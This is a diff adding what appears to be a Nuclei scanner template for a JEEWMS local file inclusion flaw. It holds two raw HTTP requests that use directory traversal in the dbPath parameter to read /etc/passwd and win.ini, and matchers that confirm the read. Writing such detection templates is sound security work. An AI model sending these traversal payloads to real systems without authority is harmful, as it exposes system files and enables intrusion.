@@ -1,0 +1,38 @@
+id: jeewms-lfi
+info:
+  author: pikpikcu
+  name: JEEWMS LFI
+  reference: https://mp.weixin.qq.com/s/ylOuWc8elD2EtM-1LiJp9g
+  severity: high
+  tags: jeewms,lfi
+requests:
+- matchers:
+  - condition: or
+    part: body
+    regex:
+    - root:.*:0:0
+    - \[(font|extension|file)s\]
+    type: regex
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  raw:
+  - 'GET /systemController/showOrDownByurl.do?down=&dbPath=../../../../../../etc/passwd  HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
+
+    Content-Type: application/x-www-form-urlencoded
+
+    '
+  - 'GET /systemController/showOrDownByurl.do?down=&dbPath=../Windows/win.ini HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
+
+    Content-Type: application/x-www-form-urlencoded
+
+    '
